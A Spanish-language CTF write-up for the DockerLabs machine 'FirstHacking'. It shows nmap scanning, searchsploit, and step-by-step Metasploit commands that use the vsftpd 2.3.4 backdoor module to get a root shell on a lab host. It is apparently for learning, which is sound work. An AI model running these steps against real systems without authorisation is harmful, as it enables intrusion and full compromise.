
# Maquina FirstHacking | Explotación de VSFTPD 2.3.4 con Metasploit

![Inicio](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/Screenshot%202025-03-14%20at%2015-50-58%20DockerLabs.png)


## 🔎 Escaneo inicial con Nmap  
Iniciamos con un escaneo para detectar puertos abiertos y versiones de servicios:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -sV -vvv -n -Pn 172.17.0.2
```

### Explicación:
- **`-p-`** → Escanea todos los puertos (1-65535).  
- **`--open`** → Muestra solo los puertos abiertos.  
- **`-sS`** → Escaneo stealth SYN (rápido y sigiloso).  
- **`--min-rate 5000`** → Acelera el escaneo enviando 5000 paquetes/seg.  
- **`-sV`** → Detecta versiones de servicios.  
- **`-vvv`** → Muestra más detalles.  
- **`-n`** → No resuelve DNS (más rápido).  
- **`-Pn`** → Asume que el host está activo.  

###  Resultado:
Solo encontramos **el puerto 21 (FTP) abierto**.  

---

##  Intento de acceso con anonymous FTP  
Primero, probamos si podemos conectarnos con usuario anónimo:  

```bash
ftp 172.17.0.2
```

Si el servidor permite **anonymous login**, podríamos acceder sin credenciales. Esto suele permitir:
- Descargar archivos públicos.
- En algunos casos, **subir archivos maliciosos** si el servidor está mal configurado.  

 **En este caso, el acceso anónimo no funcionó.** Seguimos buscando otra forma de entrar.  

---

##  Buscamos exploits para vsftpd 2.3.4  
Ejecutamos en la terminal:  

```bash
searchsploit vsftpd 2.3.4
```


El resultado nos da dos opciones:
1. Un exploit en **Python**.  
2. Un exploit en **Metasploit** (el que usaremos).  

---

##  Explotación con Metasploit  
Abrimos Metasploit en modo silencioso:

```bash
msfconsole -q
```

 **Diferencias:**  
- `msfconsole` → Abre Metasploit con la pantalla de inicio.  
- `msfconsole -q` → Lo abre en modo silencioso.  

Buscamos el exploit:

```bash
search vsftpd 2.3.4
```

El resultado nos muestra el exploit disponible:  
```bash
0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  No  VSFTPD v2.3.4 Backdoor Command Execution
```

Seleccionamos el exploit con:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Despues metemos un:

```bash
show options
```

---

##  Lanzando el exploit  
Configuramos el objetivo:

```bash
set RHOSTS 172.17.0.2
```


`use` = Escoge el exploit o módulo.<br/>
`set` = Configura parámetros necesarios.<br/>



Ejecutamos el ataque:

```bash
run
```
o  
```bash
exploit
```

Si todo sale bien, tendremos una **shell remota**.  

---

##  Comprobando acceso root  
Ejecutamos:

```bash
whoami
```

Listo, somos `root` 

---

## Conclusión  
Hemos explotado **vsftpd 2.3.4** y conseguido acceso **root** en la máquina.   

⚠ **Este material es solo para aprendizaje y CTFs legales. No lo uses en sistemas sin autorización.**
---

**En mi pagina web (Blog) subo las maquinas más a detalle, normalmento lo hago primero alla por quien guste puede checarlo de aquel lado tambien.** 

https://elyoxsecurity.com/category/maquinas/
